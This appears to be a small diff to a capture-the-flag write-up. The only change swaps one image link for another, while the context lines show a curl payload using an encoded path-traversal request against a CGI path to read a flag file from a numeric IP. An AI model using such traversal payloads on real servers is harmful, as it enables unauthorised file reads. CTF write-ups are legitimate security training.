@@ -6,4 +6,4 @@
 payload = curl 'http://164.90.201.196:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt'
 ```
 
-![](<../.gitbook/assets/image (54).png>)
+![](<../.gitbook/assets/image (55).png>)
